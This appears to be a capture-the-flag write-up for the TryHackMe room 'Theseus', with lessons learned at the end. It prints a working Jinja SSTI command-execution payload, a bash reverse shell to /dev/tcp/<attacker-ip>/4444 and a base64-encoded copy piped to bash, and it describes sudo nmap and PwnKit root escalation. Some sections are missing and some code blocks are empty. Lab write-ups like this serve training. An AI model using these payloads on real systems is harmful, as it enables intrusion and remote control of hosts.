# Overview

**Theseus** is a Hard-level TryHackMe room that combines several different areas of penetration testing.

The attack path involved:

1. TCP port scanning and service enumeration
2. Web application enumeration
3. Parameter discovery with **Arjun**
4. Identifying and exploiting **Server-Side Template Injection (SSTI)**
5. Achieving remote command execution
6. Obtaining a shell as the `minos` user
7. Local privilege escalation through misconfigured `sudo` permissions for `nmap`
8. Obtaining a root shell on the first machine
9. Enumerating the internal network
10. Pivoting to an internal host named `labyrinth`
11. Exploiting **PwnKit (CVE-2021-4034)** through `pkexec`
12. Recovering another hidden artifact disguised as corrupted data
13. Extracting credentials from the recovered image

The room was interesting because the initial web vulnerability eventually led to a completely different internal network, where additional privilege escalation and file-analysis techniques were required.

# 1. Reconnaissance

I started with a full TCP port scan using Nmap.

```bash
nmap -sC -sV -p- -T4 -oN Desktop/THM_LAB/rooms/hard/thesueus/scan.txt <target-ip>
```

The scan revealed two interesting open ports:

| Port       | Service | Purpose         |
| ---------- | ------- | --------------- |
| `22/tcp`   | SSH     | Remote access   |
| `8080/tcp` | HTTP    | Web application |

The web application on port `8080` immediately became the primary attack surface.

SSH was also worth keeping in mind because valid credentials discovered later could potentially be used for direct access.

# 4. Investigating the Strange Cipher

At this point, the strange message became more interesting.

After removing the strips of dots from the message, I obtained:

`TGUE?OSKMTUEGISYENFETOISROTSFOYTOTKUMHIAENMK`

The structure made me suspect that this could be some kind of transposition cipher, possibly a **Scytale cipher**.

The `?` character also made me wonder whether the position of the character could indicate a key.

However, rather than spending too much time trying to brute-force the ciphertext, I started thinking about another possibility:

> What if the message was not actually something that needed to be decrypted, but instead contained a hint about how the web application worked?

This led me toward parameter discovery.

# 6. Testing for SSTI

The application appeared to be Python-based, so I tested for **Server-Side Template Injection (SSTI)**.

The first payload was intentionally simple `{ { 7*7 }}`

I sent it through the `key` parameter:

```text
http://theseus.thm:8080/?key={ {7*7}}
```

![SSTI](/assets/images/writeups/theseus/4_3.png)

The server evaluated the expression and returned `49`

This confirmed that the input was being processed by a template engine.

### What is SSTI?

SSTI occurs when user-controlled input is inserted directly into a server-side template and evaluated as template code.

For example: `{ {7*7}}`

If the application evaluates it, the result becomes `49`

That means our input is not simply being displayed as text.

It is being interpreted by the template engine.

In vulnerable Python/Jinja applications, SSTI can sometimes be escalated from simple expression evaluation to arbitrary command execution.

---

# 7. From SSTI to Command Execution

After confirming SSTI, I tested whether I could access Python objects and eventually execute operating-system commands.

I used:

```bash
curl -G 'http://theseus.thm:8080/' \
--data-urlencode \ 
"key={ {request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
```

![SSTI](/assets/images/writeups/theseus/4_4.png)

The response returned: `uid=1001(minos) gid=1001(minos) groups=1001(minos)`

This confirmed that I had achieved **remote command execution** through the SSTI vulnerability.

More importantly, the command was running as `minos`

So the next objective was to enumerate the `minos` user's environment.

# 8. Enumerating the `minos` Home Directory

http://theseus.thm:8080/?key= \

This gave me the first flag.

# 10. Getting a Reverse Shell

Although SSTI provided command execution, having an interactive shell would make further enumeration much easier.

I prepared a Bash reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
```

I encoded the command using Base64:

```bash
echo "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'" | base64
```

This produced the Base64 payload used later.

I then executed it through the SSTI vulnerability.

Using `curl`:

```bash
curl -G 'http://theseus.thm:8080/' \
--data-urlencode 'key={ {request.application.__globals__.__builtins__.__import__("os") \ 
.popen("echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS8xMjM1LzQ0NDQgMD4mMQ== \ 
| base64 -d | bash").read()}}'
```

The exact encoded payload depends on the listener IP and port being used.

I also experimented with sending the request through Burp Suite.

![rce](/assets/images/writeups/theseus/6.png)

Eventually, I received an interactive shell as `minos`

# 12. Root via Nmap

I created an Nmap script containing Lua code that would execute a shell:

```bash

```

Then I executed Nmap through `sudo`:

```bash
sudo nmap --script=/tmp/executable
```

To improve the shell:

```bash
script -qc /bin/bash /dev/null
```

![minos](/assets/images/writeups/theseus/7.png)

This gave me a root shell.

At this point, the first host was fully compromised.

# 24. Analyzing the File

I initially opened the file in **Ghidra**, expecting that it might be some kind of binary.

![ghrida](/assets/images/writeups/theseus/9_3.png)

However, something about the data made me suspect that it might actually be an image rather than an executable.

I checked the file size:

```bash
ls -lh ariadne
```

Then examined the beginning of the file:

```bash
xxd -l 100 ariadne
```

I searched for JPEG magic bytes:

```bash
xxd ariadne | grep -Ei 'ffd8|ffdb|ffc0|ffc4|ffda|ffd9'
```

I also checked printable strings:

```bash
strings -n 8 ariadne | head -30
```

![image\_clue](/assets/images/writeups/theseus/9_4.png)

The presence of JPEG-related byte sequences such as `FF D8` was a strong indication that the file contained JPEG data.

---

# 25. Recovering the JPEG

The file appeared to contain garbage data before the actual JPEG content.

I inspected the region around the suspected JPEG header:

```bash
xxd -s 0x08 -l 32 ariadne
```

I then created a test copy:

```bash
cp ariadne ariadne_test.jpg
```

Since JPEG files normally begin with `FF D8`

I prepended the JPEG magic bytes:

```bash
printf '\xff\xd8' | cat - ariadne_test.jpg > recovered.jpg
```

![recovering\_image](/assets/images/writeups/theseus/9_5.png)

The resulting file could now be interpreted as an image.

> **Lessons Learned**
>
> This room covered a large number of practical penetration-testing concepts.
{: .prompt-tip }


## 1. Do not rely only on directory fuzzing

A failed `ffuf` scan does not mean the application has nothing interesting.

Hidden functionality may be exposed through:

* Parameters
* Headers
* HTTP methods
* API endpoints
* Application logic
* Template variables

In this case, **Arjun** was more useful than directory enumeration because the interesting functionality was controlled by a parameter `key`

---

## 2. Test input reflection for SSTI

The simple payload: `{ {7*7}}`

was enough to determine that the server was evaluating template expressions.

The progression was:

```text
Input
  ↓
{ {7*7}}
  ↓
49
  ↓
Template evaluation confirmed
  ↓
Python/Jinja object access
  ↓
OS command execution
  ↓
Remote Code Execution
```

---

## 3. Keep discovered credentials

The credentials discovered during the first stage did not immediately appear useful.

Instead of ignoring them, I kept them and later tested them against the internal network.

They eventually helped me access `labyrinth`

This is a good CTF habit:

> **Record every credential, username, hostname, IP address, and interesting file.**

---

## 4. Always check `sudo -l`

After getting a shell, one of my first privilege-escalation checks was:

```bash
sudo -l
```

This immediately revealed that `nmap` could be executed with elevated privileges.

That turned a normal user shell into a root shell.

---

## 5. Root on one machine does not necessarily mean the attack is over

After becoming root on the first machine, I found clues indicating that I should investigate the network.

Running:

```bash
ip addr
```

and:

```bash
netstat -tulnps
```

helped reveal the internal environment.

The internal network contained additional hosts, including:

```text
10.71.235.159
10.71.235.37
10.71.235.1
```

This introduced the concept of **pivoting through a compromised host to reach internal systems**.

---

## 6. Enumerate before exploiting

On the `labyrinth` machine, I initially suspected that the `labyrinth` file might require binary exploitation.

However, basic enumeration revealed a much more direct path:

```bash
sudo -l
find / -type f -perm /4000 2>/dev/null
pkexec --version
```

This eventually led to:

```text
pkexec
    ↓
CVE-2021-4034
    ↓
PwnKit
    ↓
root
```

This reinforced an important lesson:

> **Before attacking a complicated-looking binary, perform standard system enumeration.**

---

## 7. Learn file signatures and magic bytes

The `ariadne` file looked unusual and did not initially appear to be a normal image.

However, examining the raw bytes with:

```bash
xxd
```

revealed JPEG-related signatures.

Recognizing: `FF D8`

as the beginning of JPEG data allowed the file to be reconstructed and opened.

This is useful not only in CTFs but also in:

* Digital forensics
* Malware analysis
* File-format analysis
* Data recovery
* Incident response
